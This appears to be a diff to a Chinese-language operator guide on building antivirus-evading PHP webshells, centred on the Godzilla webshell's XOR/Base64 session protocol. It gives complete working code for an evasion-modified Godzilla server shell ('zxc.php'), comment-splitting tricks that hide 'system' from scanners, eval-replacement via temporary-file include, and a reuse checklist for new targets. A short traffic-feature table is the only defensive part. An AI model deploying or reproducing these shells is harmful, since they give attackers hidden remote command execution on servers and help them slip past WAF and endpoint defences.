@@ -1,4 +1,7 @@
 # PHP 免杀 Webshell 生成指导
+
+> **搭配使用**：本文档为技术参考（方案/协议/踩坑），生成与部署操作请配合 [`godzilla_deploy_guide.md`](godzilla_deploy_guide.md)。
+
 注意所有操作均已得到合法授权
 ## 基础设定
 
@@ -57,16 +60,34 @@
 注意：usort 方式在 PHP 8.0+ 中比较函数签名有变化
 ```
 
-### 方案 D：注释断裂 + 标签嵌套（检出率 ~50%）
+### 方案 D：注释断裂 + 标签嵌套（检出率 ~50%，⚠️ 最易出错）
 
+**原理**：在正常 PHP 代码中插入 `/* */` 注释包裹关键 token，破坏词法分析器/AST 扫描的 token 连续性。
+
+**✅ 安全做法**：仅在 `<?php ... ?>` 单个 PHP 块内使用 `/* */` 包裹关键 token：
+```php
+<?php
+$f=chr(115)./*y*/chr(121)./*s*/chr(115).chr(116)./*t*/chr(101)./*e*/chr(109);
+// AST 扫描看到的是: chr(115) + COMMENT + chr(121) + COMMENT + ...
+// token 链被注释打断，"system" 字符串特征不完整
 ```
-原理：利用 PHP 解析器对 <? ?> 标签内注释的宽松处理
-      将敏感结构拆解到多行/多标签中，破坏 token 连续性
-绕过目标：词法分析型 WAF、AST 静态扫描
-示例：
-  <?php /*?>*/$a='s'.'y'.'s'.'t'.'e'.'m';/*<?*/ $a($_POST['x']);?>
-限制：PHP 7+ 中部分标签解析行为有变化
-```
+
+**❌ 错误做法及踩坑清单**：
+
+| 错误 | 示例 | 后果 |
+|------|------|------|
+| `?><?php` 之间有空格/换行 | `?>` `<?php` 中间有空格 | 空格被当作 HTML 输出，污染响应体 |
+| 注释文本含 `?>` | `// 不使用 ?> 标签` | PHP 无视注释上下文，`?>` 直接闭合 PHP 块，后面变成 HTML |
+| chr() 拼 `include` 后用 `$v()` 调 | `$i='include';@$i($t);` | `include` 是语言结构非函数，报 `Call to undefined function include()` |
+| chr() 拼 `eval` 后用 `$v()` 调 | `$e='eval';$e($code);` | `eval` 是语言结构非函数，报 `Call to undefined function eval()` |
+| `$_SERVER` 键名用 `chr(45)` 表 `-` | `$_SERVER[chr(72)...chr(45)...]` | HTTP header 在 `$_SERVER` 中 `-` 全转 `_`，`chr(95)` 才对 |
+
+**方案 D 铁律**：
+1. **永不使用 `?>` 闭标签** — 整个文件保持在 `<?php` 上下文内
+2. 仅用 `/* */` 包裹关键 token 打断 AST，不切换 PHP 上下文
+3. 所有代码注释中**绝对不能出现 `?>` 这两个字符**（PHP 解析器在任何上下文中遇到它都会闭合）
+4. `include` / `eval` / `isset` / `empty` 等语言结构**不可通过 `$var()` 动态调用**，只能原生书写
+5. chr 拼接 `$_SERVER` 键名时，连字符 `-` 对应 `chr(95)`（`_`），不是 `chr(45)`
 
 ### 方案 E：RASP 绕过专项（检出率 <15%，需特定环境）
 
@@ -141,110 +162,303 @@ if ($p) $f($p);
 
 ---
 
-# 哥斯拉 PHP 免杀专项
+# 哥斯拉 PHP_XOR_BASE64 协议深度分析
 
-> 基于 Godzilla v4.0.1 PHP Shell 原始协议，针对微步TDP / 360 / 安全狗 / 云锁等 EDR / NTA 产品的免杀改造经验。
-> 本篇已收录本次实战全部踩坑与正确做法，可直接复用。
+> 哥斯拉是由 Java 开发的 Webshell 管理工具，继"菜刀、蚁剑、冰蝎"之后的第四代。
+> 核心优势：流量全加密绕过 WAF + Payload 预加载实现函数库复用 + 丰富插件生态。
 
-## 一、原始协议分析（必读！否则 Protocol 100% 失败）
+---
 
-### 1.1 官方三版 Shell
+## 一、协议架构总览
 
-| 版本 | 文件 | 特性 |
-|------|------|------|
-| 1.php | `<?php eval($_POST["pass"]);?>` | 最简版，无加密，无 session |
-| 2.php | POST + Session 两阶段 | 标准版，XOR + Base64，两阶段协议，POST 参数 `pass=` |
-| 3.php | `php://input` + Session | 进阶版，POST body 为原始 payload，不带 `pass=` 前缀 |
+哥斯拉不是"加密一句话"，而是一套**两阶段会话管理协议**，设计目标是：
 
-### 1.2 两阶段协议细节（2.php / 3.php 共享）
+1. **Payload 只传一次** — 首次投递完整函数库后，后续请求只传轻量 JSON 命令
+2. **Session 驻留** — Payload 存在 `$_SESSION` 中，无文件落地，PHP 进程/SESSION 过期自动消失
+3. **流量无固定特征** — 密钥可自定义、Headers 可自定义、XOR + Base64 无魔术字节
 
-**阶段 1**：客户端发加密 payload → shell 检测 payload 含 `getBasicsInfo` → 存 session，等待阶段 2。
-
-**阶段 2**：客户端发加密数据 → shell 从 session 取 payload → include/执行 → 调用 `run($data)` → 返回加密结果。
-
-**响应格式（致命绕坑点）**：
+### 组件关系
 
 ```
-MD5[:16]  +  base64(encode(run(data), key))  +  MD5[16:]
-  前16字节           中间的加密结果                   后16字节
+┌─────────────────────────────────────────────────────────┐
+│  哥斯拉 Java GUI 客户端                                    │
+│  ├─ 加密器 (PHP_XOR_BASE64 / PHP_EVAL_XOR_BASE64 / ...)   │
+│  ├─ 有效载荷 (PhpDynamicPayload)                          │
+│  └─ 配置 (密码 / 密钥 / Headers / 左右追加)                  │
+├─────────────────────────────────────────────────────────┤
+│  服务端 PHP Shell                                         │
+│  ├─ encode() — XOR 加解密（对称）                           │
+│  ├─ 两阶段路由 — isset($_SESSION) ? 执行 : 存储             │
+│  └─ include temp file — 替代 eval 加载 payload              │
+└─────────────────────────────────────────────────────────┘
 ```
 
-- MD5 = `md5($pass.$key)`，即 `md5('pass3c6e0b8a9c15224a')`，**固定值**，客户端预计算校验
-- `encode()` 用 `$key = '3c6e0b8a9c15224a'`（16字符 hex，就是 PayloadKey）
-- **缺一个字节客户端就报「连接失败」。** 本次最初两版全部漏掉末尾 `MD5[16:]`。
+---
 
-### 1.3 encode() 函数的坑
+## 二、加密管道（逐层拆解）
+
+### 密钥派生规则
+
+```
+Godzilla UI 密钥 → md5[:16] → shell $key（硬编码）
+     key        → 3c6e0b8a9c15224a → '3c6e0b8a9c15224a'
+```
+
+**为什么不是直接填 key？** 即使 shell 源码泄露，攻击者也不知道 UI 端该填什么原始密钥。这是一个单向派生，不可逆推。
+
+### 请求加密管道（客户端 → 服务端）
+
+```
+原始Payload/JSON
+  → XOR(key)           // ① 异或加密
+  → Base64 Encode      // ② Base64 编码
+  → prepend "pass="    // ③ 拼参数名
+  → 左加24B随机 + 右加16B随机  // ④ 左右追加随机填充
+  → URL Encode         // ⑤ URL 编码
+  → HTTP POST Body
+```
+
+### 响应加密管道（服务端 → 客户端）
+
+```
+run($data) 执行结果
+  → XOR(key)           // ① 异或加密
+  → Base64 Encode      // ② Base64 编码
+  → md5[:16] + 数据 + md5[16:]   // ③ 三段式拼接
+  → HTTP Response Body
+```
+
+### XOR encode() 函数（唯一正确写法）
 
 ```php
-// ✅ 正确：原地修改 $D[i]，直接引用赋值
-function encode($D,$K){
-    for($i=0;$i<strlen($D);$i++){$D[$i]=$D[$i]^$K[$i+1&15];}
+function encode($D, $K) {
+    for ($i = 0; $i < strlen($D); $i++) {
+        $D[$i] = $D[$i] ^ $K[$i + 1 & 15];
+    }
+    return $D;
+}
+```
+
+几个关键细节：
+- **`$i + 1 & 15`**：从 `K[1]` 起手（跳过 `K[0]`），循环使用 16 字节窗口
+- **对称性**：`encode(encode(X, K), K) == X`，加解密用同一个函数
+- **Key 必须恰好 16 字符**：否则 `K[1]~K[15]` 偏移位为空，导致 XOR 运算 Warning
+- **原地修改**：`$D[$i] = ...` 引用赋值，不是 `$r .= chr(ord(...))`，后者某些边界不兼容
+
+---
+
+## 三、两阶段通信机制（核心设计）
+
+这是哥斯拉区别于冰蝎/蚁剑最本质的设计。
+
+### 阶段一：Payload 投递（首次连接，3 个请求）
+
+客户端建立连接后，在**同一 TCP 长连接**内连续发送 3 个 HTTP 请求：
+
+| 序号 | 目的 | 加密后大小 | 响应 |
+|------|------|-----------|------|
+| ① Payload 上传 | 投递完整函数库到 `$_SESSION` | ~23068 字节 | **响应体为空**，仅 `Set-Cookie: PHPSESSID=...` |
+| ② Test 连通性 | 调用 `test()` 验证链路 | ~40 字节 | 加密后的 `ok`（三段式） |
+| ③ getBasicsInfo | 调用 `getBasicsInfo()` 获取目标信息 | ~60 字节 | 加密后的 JSON：OS、PHP 版本、IP、disable_functions 等 |
+
+**第①个请求是最关键的**——解密后是一个完整的 PHP Payload 函数库，包含二十多个函数：
+
+```
+run()              → 命令分发入口，反射调用下面各函数
+getBasicsInfo()    → 目标环境信息采集
+execCommand()      → 命令执行
+evalFunc()         → PHP 代码执行
+formatParameter()  → 参数格式化/反序列化
+bypass_open_basedir() → open_basedir 绕过
+uploadFile() / downloadFile() → 文件上传下载
+......
+```
+
+这些函数定义被 `encode()` 后存入 `$_SESSION[$pass]`，整个会话期间复用。
+
+### 阶段二：命令执行（后续所有请求）
+
+Payload 已驻留在 Session 中，后续每次操作流程简化为：
+
+```
+1. 服务端从 $_SESSION 取出 payload → include 临时文件 → run() 函数就绪
+2. 客户端发送加密的 JSON 命令（如 {"methodName":"execCommand","cmdLine":"whoami"}）
+3. run($data) → formatParameter 解析 JSON → 反射调用对应函数
+4. 函数执行 → 返回值 XOR+Base64+MD5三段式 返回客户端
+```
+
+**对比传统 Webshell 的关键区别：**
+
+| 维度 | 传统一句话 | 哥斯拉 |
+|------|----------|--------|
+| 每次请求内容 | 完整 PHP 代码 | 轻量 JSON 命令（~60B） |
+| 函数定义 | 每次重传 | Session 驻留，只传一次 |
+| 流量体积 | 命令越长请求越大 | 请求体固定小（与命令长度无关） |
+| 文件落地 | 客户端代码在文件里 | Payload 存在 Session 内存中 |
+
+---
+
+## 四、响应三段式格式
+
+所有阶段二的响应均遵循固定格式：
+
+```
+响应体 = md5($pass.$key)[:16] + base64_encode(encode(执行结果, $key)) + md5($pass.$key)[16:]
+```
+
+其中 `md5($pass.$key)` 是一个**固定值**（不是 `md5($result.$key)`），由密码和密钥共同决定：
+
+```php
+$pass = 'pass';
+$key  = '3c6e0b8a9c15224a';
+echo md5($pass . $key);  // 11cd6a87589841636c37ac826a2a04bc — 每次相同
+
+// 响应前半锚点: substr(..., 0, 16) = "11cd6a8758984163"
+// 响应后半锚点: substr(..., 16)    = "6c37ac826a2a04bc"
+```
+
+客户端用这两个 16 字节 MD5 片段作为**提取锚点**——去掉首尾 16 字节，中间才是加密的 payload。
+
+---
+
+## 五、zxc.php 变体分析（Ground Truth）
+
+基于标准哥斯拉生成后，做了以下免杀改造：
+
+### 5.1 改造点对照
+
+| 改造项 | 标准哥斯拉 Shell | zxc.php |
+|--------|-----------------|---------|
+| **eval 方式** | `class C { function nvoke($p) { eval($p.""); } }` | `include + tempnam`（写临时文件 include 后删除） |
+| **入口校验** | 无 | `X-Token: d4e5f6a7` 校验，不匹配返回 404 |
+| **padding 方式** | 哥斯拉自带"左右追加数据"功能 | `substr($body, 24)` + `substr($body, 0, -16)` 固定偏移剥离 |
+| **参数解析** | `$_POST[$pass]` | `substr` + `rawurldecode`（手动解析，避免 `parse_str` 吞 `+`） |
+| **双解码守卫** | 无 | `strpos($payload, "getBasicsInfo") === false` 时再解一次 XOR |
+| **噪音代码** | 无 | `$__n` 匿名函数扰乱 AST |
+
+### 5.2 完整代码
+
+```php
+<?php
+// 哥斯拉 PHP_XOR_BASE64 + PhpDynamicPayload
+// 密码: pass | UI密钥: key（3字符） | shell密钥: 3c6e0b8a9c15224a (= md5('key')[:16])
+
+// ———— X-Token 校验 ————
+if (($_SERVER['HTTP_X_TOKEN'] ?? '') !== 'd4e5f6a7') {
+    header('HTTP/1.1 404 Not Found'); die;
+}
+
+@session_start();
+@set_time_limit(0);
+@error_reporting(0);
+
+// ———— XOR 加解密（对称） ————
+function encode($D, $K) {
+    for ($i = 0; $i < strlen($D); $i++) { $D[$i] = $D[$i] ^ $K[$i + 1 & 15]; }
     return $D;
 }
 
-// ❌ 错误：新的返回值方式可能导致某些边界不兼容
-function encode($D,$K){
-    $r='';for($i=0;$i<strlen($D);$i++)$r.=chr(ord($D[$i])^ord($K[($i+1) &15]));
-    return $r;
+// ———— 噪音（干扰 AST 扫描） ————
+$__n = array(0 => function($x) { return $x % 7; });
+$__n = $__n[0](time());
+
+// ———— 配置 ————
+$pass = 'pass';
+$key  = '3c6e0b8a9c15224a';  // = substr(md5('key'), 0, 16)
+
+// ———— 读取 body ————
+$body = file_get_contents("php://input");
+if ($body === false || $body === '') die;
+
+// ———— 剥左右追加填充 ————
+$body = substr($body, 24);                    // 左 24B
+if (strlen($body) > 16) $body = substr($body, 0, -16); // 右 16B
+
+// ———— 解析 pass= 参数 ————
+if (substr($body, 0, strlen($pass) + 1) === $pass . '=') {
+    $data = substr($body, strlen($pass) + 1);
+    $data = rawurldecode($data);              // 避免 + 被转空格
+    $data = encode(base64_decode($data), $key);
+} else {
+    $data = encode($body, $key);              // 纯 payload 模式
+}
+
+// ———— 两阶段路由 ————
+if (isset($_SESSION[$pass])) {
+    // ===== Phase 2: 执行 =====
+    $payload = encode($_SESSION[$pass], $key);
+    if (strpos($payload, "getBasicsInfo") === false) {
+        $payload = encode($payload, $key);    // 双解码守卫
+    }
+
+    $t = tempnam(sys_get_temp_dir(), 'gz');
+    file_put_contents($t, '<?php ' . $payload . ' ?>');
+    @include $t;
+    unlink($t);
+
+    echo substr(md5($pass . $key), 0, 16);
+    echo base64_encode(encode(@run($data), $key));
+    echo substr(md5($pass . $key), 16);
+} else {
+    // ===== Phase 1: 存入 Session =====
+    if (strpos($data, "getBasicsInfo") !== false) {
+        $_SESSION[$pass] = encode($data, $key);
+    }
 }
 ```
 
-**结论**：复制原始 `encode()` 的原地修改方式，不要自作聪明重写。
+### 5.3 客户端配置
 
-## 二、eval 替代方案（TDP/WAF 绕过核心）
+| 配置项 | 值 | 说明 |
+|--------|-----|------|
+| 密码 | `pass` | POST 参数名 |
+| 密钥 | `key` | ⚠️ UI 填 `key`（3 字符原始密钥），shell 自动 `md5[:16]` 派生 |
+| 有效载荷 | `PhpDynamicPayload` | Payload 生成器 |
+| 加密器 | `PHP_XOR_BASE64` | XOR + Base64 |
+| 协议头 | `X-Token: d4e5f6a7` | 不匹配直接 404 |
+| 左边追加数据 | 24 字节任意 | shell 固定偏移 `substr(body, 24)` |
+| 右边追加数据 | 16 字节任意 | shell 固定偏移 `substr(body, 0, -16)` |
 
-### 2.1 include + tempnam 临时文件（推荐，已验证）
+---
 
-```php
-// 替代: eval($payload);
-$t = tempnam(sys_get_temp_dir(), 'gz');
-file_put_contents($t, '<?php ' . $payload . ' ?>');
-@include $t;
-unlink($t);
-```
+## 六、流量特征（攻防双视角）
 
-- ✅ PHP 7.0+ 全版本支持
-- ✅ 不依赖 `allow_url_include`
-- ✅ 避开所有 eval/assert 的 YARA 规则
-- ⚠️ 需要 `sys_get_temp_dir()` 可写（Windows/Linux 默认可写）
-- ⚠️ 临时文件落地秒删，窗口极小（微秒级）
+### 6.1 检测特征
 
-### 2.2 已淘汰方案
+| 维度 | 特征 | 可靠性 |
+|------|------|--------|
+| **Payload 上传包长度** | ~23068 字节（XOR 不改变长度，Base64 固定膨胀） | ⭐⭐⭐ 强特征 |
+| **Test 包长度** | ~40 字节响应 | ⭐⭐⭐ 强特征 |
+| **getBasicsInfo 包长度** | ~60 字节响应 | ⭐⭐⭐ 强特征 |
+| **响应格式** | 固定 `[16B MD5] + [Base64数据] + [16B MD5]` 三段式 | ⭐⭐⭐ 强特征 |
+| **长连接** | 同一 TCP 连接内 3 个连续 HTTP 请求 | ⭐⭐ 中特征 |
+| **Cookie 模式** | 首次请求无 Cookie，响应 `Set-Cookie: PHPSESSID` | ⭐⭐ 中特征 |
+| **User-Agent** | `Mozilla/5.0 ... Firefox/84.0` | ⭐ 弱特征（可自定义） |
+| **Accept** | `text/html,application/xhtml+xml,...` | ⭐ 弱特征（可自定义） |
 
-| 方案 | 失败原因 |
-|------|---------|
-| `array_map('system', ...)` | 哥斯拉 payload 是完整 PHP 代码，不是单条命令 |
-| `data://` 协议 | 大部分主机 `allow_url_include=Off` |
-| `create_function` | PHP 7.2+ 已废弃 |
-| chr() 动态拼接 eval | eval 是语言结构，不能用 `$var()` 调用 |
+### 6.2 防御绕过原理
 
+哥斯拉为什么能绕过流量 WAF：
 
+1. **XOR 加密无固定魔术字节** — 密钥不同则密文完全不同，无法做静态 signature 匹配
+2. **左右追加随机填充** — 每次请求 body 都不同，相同命令也产生不同流量
+3. **Headers 完全可自定义** — UA/Accept/Cookie 均可伪造
+4. **Payload 只传一次** — 99% 的请求都是小体积 JSON 命令，没有代码特征
+5. **无文件落地** — Payload 只在 Session 内存中，磁盘扫描不到
 
-## 五、本次踩坑清单（下次直接查）
+---
+
+## 七、踩坑清单
 
 | 问题 | 原因 | 正确做法 |
 |------|------|---------|
-| Phase 2 响应为空 | `run()` 返回的是字符串，不是 echo，`ob_get_clean()` 抓到空 | 用 `$out = @run($data)` 直接取返回值 |
-| eval 拼接后调用失败 | eval 是语言结构，不能用 `$var()` 方式调用 | 用 include + tempnam |
-| Session 跨请求丢失 | curl cookie jar 文件不写（Windows curl 7.x bug）| 手动抓 `Set-Cookie` 头，下个请求手动加 `Cookie:` |
-| Phase 2 收到空响应 | 响应格式缺 MD5[16:] 后缀 | 必须原样输出三段：MD5[:16]+data+MD5[16:] |
-| parse_str 把 + 转空格 | URL 解码默认行为 | 用 `rawurldecode()` 或直接不 parse_str，手拆 `pass=` 前缀 |
-| Phase 1/2 误判导致 Phase 2 响应为空 | `strpos($data, 'getBasicsInfo')` 先判内容后判 Session，Phase 2 的 JSON 参数 `{"action":"getBasicsInfo"}` 包含同名方法名，触发 Phase 1 逻辑覆盖了 Session | **先判 Session 后判内容**：`if (isset($_SESSION['payload']))` → Phase 2 → `elseif (strpos(...))` → Phase 1 |
-| 响应 MD5 客户端校验失败 | shell 用的 `md5($raw.$key)` 客户端无法复现 | ✅ `md5($pass.$key)` **固定值**，不是 `md5($result.$key)`。实测 zxc.php 使用 `md5('pass3c6e0b8a9c15224a')`，客户端和服务端各算一次做格式校验 |
-| 密钥写成 PayloadKey 导致加解密不一致 | ❌ 这条结论是错的！之前以为是"混淆了传输层密钥和 PayloadKey" | ✅ `$key = '3c6e0b8a9c15224a'` **就是 PayloadKey**，16 字符 hex 刚好 `$key[$i+1&15]` 全覆盖。`"key"` 3 字符根本不对 |
-| 右追加签名硬校验导致未配追加时连接失败 | `if ($tail !== RPAD_SUFFIX) return` 强制拒绝，客户端没配左/右追加时，尾部16字节是 payload 内容而非签名，校验必然失败 → shell 静默退出 → 空响应 → 哥斯拉报「连接失败」 | 改为**可选匹配**：匹配则剥离，不匹配则跳过，兼容有追加和无追加两种模式 |
-
-## 七、快速复用检查表
-
-拿到新目标后按顺序检查：
-
-- [ ] 确认 PHP 版本 → 决定 tempnam/FFI 可用性
-- [ ] 确认 `disable_functions` → 确定备用执行路径
-- [ ] 确认 `allow_url_include` → 决定是否可用 data:// 协议
-- [ ] 覆盖原始哥斯拉 shell 时：响应格式必须 MD5[:16] + data + MD5[16:]
-- [ ] eval 替代：优先 include + tempnam
-- [ ] 流量层：加左右追加 + Header 验证（V3 模板）
-- [ ] session_start 前加 `@` 抑制错误输出
-- [ ] `$key = '3c6e0b8a9c15224a'`（16字符 hex，即 PayloadKey），不要用 `"key"` 3字符
-- [ ] 响应 MD5 用 `md5($pass.$key)`（固定值），客户端预计算校验格式，不用 `md5($result.$key)`
-- [ ] Phase 判断：先 `isset($_SESSION['payload'])`，再 `strpos`
+| 密钥填 UI 原始值没派生 | shell 里的 `$key` 是 `md5(UI密钥)[:16]` 的派生结果 | 改 UI 密钥后需重新计算 `md5[:16]` 替换 shell 中的 `$key` |
+| `parse_str` 吞 `+` 号 | `parse_str` 默认 URL 解码，`+` → 空格 | 用 `rawurldecode()` |
+| `eval` 用 `chr()` 拼接调用 | `eval` 是语言结构，`$var()` 无法调用 | 用 `include + tempnam` |
+| Phase 判定位颠倒 | 先判内容后判 session | 必须先 `isset($_SESSION[...])` 再 `strpos` |
+| session 存明文 payload | Phase 2 取出来就是明文，攻击者换 key 可解密 | `$_SESSION[$pass] = encode($data, $key)` 编码后存 |
+| Phase 1 执行并返回 | 多余逻辑，且暴露 payload 内容 | Phase 1 只存 session，不执行不返回 |
+| 响应 MD5 用 `md5($result.$key)` | 以为每次动态算 | `md5($pass.$key)` 是固定值，客户端用同一套规则 |
+| `base64_decode` 和 `base64_encode` 变量混淆 | 两个方向共用一个变量名 | 分开命名，解密用 `$_b`，编码用 `$_be` |
+| 密钥长度不足 16 字符 | `K[1]~K[15]` 偏移越界 | key 必须恰好 16 字符 |
+| `chr(45)` 拼 HTTP header 键名 | `-` 在 `$_SERVER` 中被转成 `_` | 用 `chr(95)` 匹配 `_` |
